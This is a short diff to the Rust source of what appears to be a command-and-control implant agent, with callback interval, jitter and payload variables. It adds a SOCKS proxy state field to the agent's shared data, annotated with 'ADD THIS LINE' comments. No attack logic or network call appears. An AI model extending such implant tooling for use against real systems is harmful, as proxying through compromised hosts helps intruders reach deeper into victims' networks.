@@ -1,12 +1,13 @@
 use crate::payloadvars;
 use crate::tasking::Tasker;
+use crate::socks::SocksState;  // ← ADD THIS LINE
+use std::sync::Arc;            // ← ADD THIS LINE
 use chrono::prelude::{DateTime, NaiveDate};
 use chrono::{Duration, Local, NaiveDateTime, NaiveTime};
 use rand::Rng;
 use serde::{Deserialize, Serialize};
 use serde_json::json;
 use std::error::Error;
-
 use crate::profiles::Profile;
 
 #[cfg(target_os = "linux")]
@@ -77,7 +78,8 @@ pub struct ContinuedData {
 pub struct SharedData {
     /// Sleep interval of the agent
     pub sleep_interval: u64,
-
+    ///socks
+    pub socks_state: Option<Arc<SocksState>>,  // socks
     /// Jitter of the agent
     pub jitter: u64,
 
@@ -110,12 +112,12 @@ impl Agent {
     /// Creates a new `Agent` object
     pub fn new() -> Self {
         let c2profile = Profile::new(payloadvars::payload_uuid());
-
         // Return a new `Agent` object
         Self {
             shared: SharedData {
                 jitter: payloadvars::callback_jitter(),
                 sleep_interval: payloadvars::callback_interval(),
+                socks_state: None,  // ← ADD THIS LINE
                 exit_agent: false,
                 working_start: payloadvars::working_start(),
                 working_end: payloadvars::working_end(),
